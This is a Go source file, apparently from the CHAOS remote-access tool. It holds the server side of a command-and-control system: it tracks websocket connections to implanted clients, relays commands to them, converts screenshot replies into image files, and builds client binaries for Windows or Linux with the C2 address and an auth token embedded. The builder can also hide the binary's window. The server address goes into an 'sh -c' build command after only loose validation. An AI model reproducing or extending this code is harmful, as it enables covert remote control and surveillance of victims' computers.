package client

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/image"
	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"github.com/tiagorlampert/CHAOS/services/payload"
	"net"
	"net/url"
	"os/exec"
	"strings"
	"sync"
)

type clientService struct {
	AppVersion     string
	Clients        map[string]*websocket.Conn
	Mu             *sync.Mutex
	configuration  *environment.Configuration
	Repository     authRepo.Repository
	PayloadService payload.Service
	AuthService    auth.Service
}

func NewClientService(
	appVersion string,
	configuration *environment.Configuration,
	repository authRepo.Repository,
	payloadCache payload.Service,
	authService auth.Service,
) Service {
	return &clientService{
		AppVersion:     appVersion,
		configuration:  configuration,
		Clients:        make(map[string]*websocket.Conn, 0),
		Mu:             &sync.Mutex{},
		Repository:     repository,
		PayloadService: payloadCache,
		AuthService:    authService,
	}
}

func (c clientService) GetConnection(clientID string) (*websocket.Conn, bool) {
	c.Mu.Lock()
	conn, found := c.Clients[clientID]
	c.Mu.Unlock()
	return conn, found
}

func (c clientService) RemoveConnection(clientID string) error {
	c.Mu.Lock()
	delete(c.Clients, clientID)
	c.Mu.Unlock()
	return nil
}

func (c clientService) AddConnection(clientID string, connection *websocket.Conn) error {
	c.Mu.Lock()
	c.Clients[clientID] = connection
	c.Mu.Unlock()
	return nil
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	client, found := c.GetConnection(input.ClientID)
	if !found {
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	}

	requestMessage, err := json.Marshal(payload.Data{
		Request: input.Request,
	})
	if err != nil {
		return SendCommandOutput{}, err
	}

	err = client.WriteMessage(websocket.BinaryMessage, requestMessage)
	switch {
	case websocket.IsCloseError(err), websocket.IsUnexpectedCloseError(err):
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	case err != nil:
		return SendCommandOutput{}, err
	}

	_, responseMessage, err := client.ReadMessage()
	switch {
	case websocket.IsCloseError(err), websocket.IsUnexpectedCloseError(err):
		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
	case err != nil:
		return SendCommandOutput{}, err
	}

	var response request.RespondCommandRequestBody
	if err := json.Unmarshal(responseMessage, &response); err != nil {
		return SendCommandOutput{}, err
	}

	data := &payload.Data{
		Response: response.Response,
		HasError: response.HasError,
	}

	data, err = HandleResponse(data)
	if err != nil {
		return SendCommandOutput{}, err
	}

	res := utils.ByteToString(data.Response)
	if data.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: internal.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func HandleResponse(payload *payload.Data) (*payload.Data, error) {
	switch payload.Request {
	case "screenshot":
		file, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(file)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	if !isValidIPAddress(input.ServerAddress) && !isValidURL(input.ServerAddress) {
		return "", internal.ErrInvalidServerAddress
	}

	filename, err := utils.NormalizeString(input.Filename)
	if err != nil {
		return "", err
	}

	newToken, err := c.GenerateNewToken()
	if err != nil {
		return "", err
	}

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.HttpPort=%s -X main.WebSocketPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`

	filename = buildFilename(input.OSTarget, filename)
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, c.configuration.Server.Port, input.ServerPort, input.ServerAddress, newToken, filename)

	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = "client/"

	outputErr, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%w:%s", err, outputErr)
	}
	return filename, nil
}

func isValidIPAddress(s string) bool {
	return net.ParseIP(s) != nil
}

func isValidURL(s string) bool {
	if _, err := url.ParseRequestURI(s); err != nil {
		return false
	}
	return true
}

func (c clientService) GenerateNewToken() (string, error) {
	config, err := c.AuthService.GetAuthConfig()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func buildFilename(os system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch os {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
